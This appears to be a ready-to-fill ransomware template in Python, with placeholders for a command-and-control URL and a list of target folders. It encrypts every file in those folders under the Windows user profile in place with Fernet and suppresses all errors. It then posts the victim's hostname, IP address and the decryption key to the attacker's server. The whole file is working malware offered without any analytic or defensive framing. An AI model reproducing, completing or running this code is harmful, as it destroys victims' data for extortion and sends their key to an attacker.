import os
import socket
import requests
from cryptography.fernet import Fernet

C2_SERVER = "__C2_SERVER_URL__"
TARGET_DIRECTORIES = __TARGET_DIRECTORIES__

def report_victim(key_data, algo_type):
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        data = {
            'hostname': hostname,
            'ip_address': ip_address,
            'os': 'Windows',
            'encryption_key': key_data,
            'encryption_type': algo_type,
            'status': 'encrypted'
        }
        requests.post(C2_SERVER, json=data, timeout=15)
    except Exception as e:
        pass

def encrypt_files():
    user_profile = os.environ.get('USERPROFILE', 'C:/Users/Default')
    key = Fernet.generate_key()
    fernet = Fernet(key)
    
    for target_name in TARGET_DIRECTORIES:
        if os.path.isabs(target_name):
            target_dir = target_name
        else:
            target_dir = os.path.join(user_profile, target_name)
            
        if os.path.exists(target_dir):
            for root, dirs, files in os.walk(target_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, "rb") as f:
                            data = f.read()
                        encrypted = fernet.encrypt(data)
                        with open(file_path, "wb") as f:
                            f.write(encrypted)
                    except Exception:
                        pass
                    
    report_victim(key.decode(), "AES")

if __name__ == '__main__':
    encrypt_files()